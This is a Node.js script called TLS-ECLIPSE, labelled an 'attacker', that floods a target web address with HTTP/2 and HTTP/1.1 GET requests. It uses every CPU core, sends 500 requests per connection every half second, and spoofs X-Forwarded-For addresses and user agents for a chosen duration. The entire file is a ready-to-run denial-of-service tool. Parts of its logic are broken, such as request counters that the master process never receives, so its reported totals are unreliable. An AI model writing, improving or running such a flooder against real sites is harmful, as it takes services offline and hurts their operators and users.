// TLS-ECLIPSE.js
const http = require('http');
const http2 = require('http2');
const url = require('url');
const cluster = require('cluster');
const os = require('os');

if (process.argv.length !== 4) {
    console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

const parsed = url.parse(target);
const host = parsed.host;
const path = parsed.path || '/';
const port = 443;
const cores = os.cpus().length;
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    // Add more for variety
];

let h2RequestsSent = 0;
let h1RequestsSent = 0;

function randIP() {
    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.log(`======================================`);
    console.log(`         TLS-ECLIPSE ATTACKER`);
    console.log(`======================================`);
    console.log(`[+] Target     : ${target}`);
    console.log(`[+] Duration   : ${duration}s`);
    console.log(`[+] Cores Used : ${cores}`);
    console.log(`======================================`);

    for (let i = 0; i < cores; i++) {
        cluster.fork();
    }

    const startTime = Date.now();
    const start = new Date().toLocaleTimeString();
    console.log(`\n[+] Attack Started @ ${start}`);

    setInterval(() => {
        const timeElapsed = Math.floor((Date.now() - startTime) / 1000);
        const timeLeft = duration - timeElapsed;

        console.clear();
        console.log(`======================================`);
        console.log(`[+] Attack Running...`);
        console.log(`======================================`);
        console.log(`[+] H2 Requests Sent: ${h2RequestsSent}`);
        console.log(`[+] H1 Requests Sent: ${h1RequestsSent}`);
        console.log(`[+] Time Left: ${timeLeft}s`);
        console.log(`======================================`);
    }, 1000);

    setTimeout(() => {
        console.log(`\n[+] Attack Ended @ ${new Date().toLocaleTimeString()}`);
        process.exit(1);
    }, duration * 1000);
} else {
    let loopCount = 0;

    function launchAttack() {
        // For HTTP/2
        if (Math.random() < 0.5) {
            const client = http2.connect(`https://${host}`);

            client.on('error', () => {
                // Retry after error
                setTimeout(launchAttack, 2000); // Retry after 2 seconds
            });

            for (let i = 0; i < 500; i++) {  // 500 requests per connection
                const headers = {
                    ':method': 'GET',
                    ':path': path,
                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'x-forwarded-for': randIP(),
                    'accept': '*/*'
                };

                const req = client.request(headers);
                req.on('response', () => {});
                req.end();
            }

            h2RequestsSent += 500; // Increment H2 requests count
            client.close(); // Close connection after requests
        } else {
            // For HTTP/1.1
            const options = {
                hostname: host,
                port: 80,
                path: path,
                method: 'GET',
                headers: {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'X-Forwarded-For': randIP(),
                    'Connection': 'keep-alive'
                }
            };

            const req = http.request(options, (res) => {
                res.on('data', () => {}); // No need to handle the data
            });

            for (let i = 0; i < 500; i++) {  // 500 requests per connection
                req.end(); // Send request
            }

            h1RequestsSent += 500; // Increment H1 requests count
        }

        loopCount++;
    }

    const interval = setInterval(launchAttack, 500);  // Slow down to 500ms between each attack

    process.on('exit', () => {
        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 500} requests`);
    });
}
